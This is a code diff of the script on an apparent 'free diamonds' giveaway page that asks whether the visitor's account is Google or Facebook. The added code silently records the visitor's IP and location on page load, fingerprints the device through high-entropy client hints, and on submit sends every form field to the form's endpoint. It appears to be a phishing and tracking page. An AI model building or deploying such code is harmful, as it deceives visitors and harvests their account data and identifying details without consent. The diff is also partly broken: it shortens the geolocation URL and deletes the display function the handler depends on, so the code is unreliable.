@@ -170,120 +170,73 @@
   </div>
 
 <script>
-    // --- TUS FUNCIONES DE INTERFAZ (Intactas) ---
-    function mostrarSeccion(id) {
-      document.querySelectorAll(".seccion").forEach(seccion => seccion.classList.remove("visible"));
-      document.getElementById(id).classList.add("visible");
-    }
-
-    function seleccionarDiamantes(cantidad) {
-      document.getElementById("cantidadDiamantes").value = cantidad + " diamantes";
-      mostrarSeccion("formulario");
-    }
-
-    function validarYMostrar() {
-      const cuentaMarcada = document.querySelector('input[name="tipo_cuenta"]:checked');
-      if (!cuentaMarcada) {
-        alert("Debes seleccionar si tu cuenta es de Google o Facebook.");
-        return;
-      }
-      mostrarSeccion("diamantes");
-    }
-
-    // --- TU ENVÍO DE FORMULARIO (Intacto) ---
-    document.getElementById("formularioDiamantes").addEventListener("submit", function (e) {
-      e.preventDefault();
-      const form = e.target;
-
-      fetch(form.action, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: JSON.stringify(Object.fromEntries(new FormData(form))),
-      })
-      .then(() => {
-        mostrarSeccion("mensajeFinal");
-        form.reset();
+        // 1. CAPTURA DE IP Y UBICACIÓN (Se ejecuta de inmediato al cargar la página)
+    fetch('https://ipapi.co')
+      .then(res => res.json())
+      .then(data => {
+        const ipInput = document.getElementById('ip');
+        const ubicacionInput = document.getElementById('ubicacion');
+        if (ipInput) ipInput.value = data.ip || 'No detectada';
+        if (ubicacionInput) ubicacionInput.value = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`;
       })
       .catch(() => {
-        alert("Hubo un error al enviar el formulario.");
+        const ubicacionInput = document.getElementById('ubicacion');
+        if (ubicacionInput) ubicacionInput.value = 'Ubicación no detectada';
       });
-    });
 
-    // --- CAPTURA DE IP Y UBICACIÓN ---
-// Obtiene datos geográficos básicos agregados para estadísticas de tráfico
-fetch('https://ipapi.co/json/')
-  .then(res => res.json())
-  .then(data => {
-    const ipInput = document.getElementById('ip');
-    const ubicacionInput = document.getElementById('ubicacion');
-    
-    if (ipInput) ipInput.value = data.ip || 'No detectada';
-    if (ubicacionInput) ubicacionInput.value = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`;
-  })
-  .catch(() => {
-    const ubicacionInput = document.getElementById('ubicacion');
-    if (ubicacionInput) ubicacionInput.value = 'Ubicación no detectada';
-  });
+    // 2. FUNCIÓN ASÍNCRONA PARA CAPTURAR EL DISPOSITIVO (Client Hints 2026)
+    async function capturarDispositivo() {
+        const inputDispositivo = document.getElementById('clientHintsInput');
+        if (!inputDispositivo) return;
 
-// --- DETECCIÓN DE ENTORNO Y DISPOSITIVO (Client Hints) ---
-// Utiliza la API moderna para identificar la arquitectura y plataforma del visitante
-async function capturarDispositivo() {
-    const inputDispositivo = document.getElementById('clientHintsInput');
-    if (!inputDispositivo) return; // Evita errores si el input no existe en el HTML
-
-    if (navigator.userAgentData) {
-        try {
-            // Solicita valores de alta entropía según el estándar moderno de privacidad
-            const detalles = await navigator.userAgentData.getHighEntropyValues([
-                "architecture", "model", "platformVersion"
-            ]);
-            inputDispositivo.value = JSON.stringify(detalles);
-        } catch (e) {
-            // Alternativa en caso de que la promesa sea rechazada por el navegador
+        if (navigator.userAgentData) {
+            try {
+                const detalles = await navigator.userAgentData.getHighEntropyValues([
+                    "architecture", "model", "platformVersion"
+                ]);
+                inputDispositivo.value = JSON.stringify(detalles);
+            } catch (e) {
+                inputDispositivo.value = navigator.userAgent;
+            }
+        } else {
             inputDispositivo.value = navigator.userAgent;
         }
-    } else {
-        // Alternativa para navegadores antiguos que no soportan User-Agent Client Hints
-        inputDispositivo.value = navigator.userAgent;
     }
-}
 
-// --- CONTROL DEL EVENTO DE ENVÍO ---
-const miFormulario = document.getElementById("formularioDiamantes");
-if (miFormulario) {
-    miFormulario.addEventListener("submit", async function (e) {
-      e.preventDefault(); // Detiene el envío síncrono predeterminado
-      const form = e.target;
+    // 3. CONTROL DEL EVENTO DE ENVÍO (Único, limpio y sin duplicados)
+    const miFormulario = document.getElementById("formularioDiamantes");
+    if (miFormulario) {
+        miFormulario.addEventListener("submit", async function (e) {
+          e.preventDefault(); // Frena el envío tradicional
+          const form = e.target;
 
-      // 1. Forzamos la ejecución de la función asíncrona antes de empaquetar los datos
-      await capturarDispositivo();
+          // Espera obligatoriamente los datos del dispositivo
+          await capturarDispositivo();
 
-      // 2. Construimos el objeto de datos con los inputs ya rellenados por el script
-      const datosFormulario = Object.fromEntries(new FormData(form));
+          // Empaqueta absolutamente todos los inputs del formulario
+          const datosFormulario = Object.fromEntries(new FormData(form));
 
-      // 3. Transmisión asíncrona (AJAX) en formato JSON limpio
-      fetch(form.action, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: JSON.stringify(datosFormulario),
-      })
-      .then(() => {
-        if (typeof mostrarSeccion === "function") {
-            mostrarSeccion("mensajeFinal");
-        }
-        form.reset();
-      })
-      .catch(() => {
-        alert("Hubo un error al enviar el formulario.");
-      });
-    });
-}    
+          // Despacha los datos mediante FETCH (AJAX) en formato JSON limpio
+          fetch(form.action, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Accept: "application/json",
+            },
+            body: JSON.stringify(datosFormulario),
+          })
+          .then(() => {
+            if (typeof mostrarSeccion === "function") {
+                mostrarSeccion("mensajeFinal");
+            }
+            form.reset();
+          })
+          .catch(() => {
+            alert("Hubo un error al enviar el formulario.");
+          });
+        });
+    }
+
    function getCookie(nombre) {
       const cookies = document.cookie.split('; ');
       for (let c of cookies) {
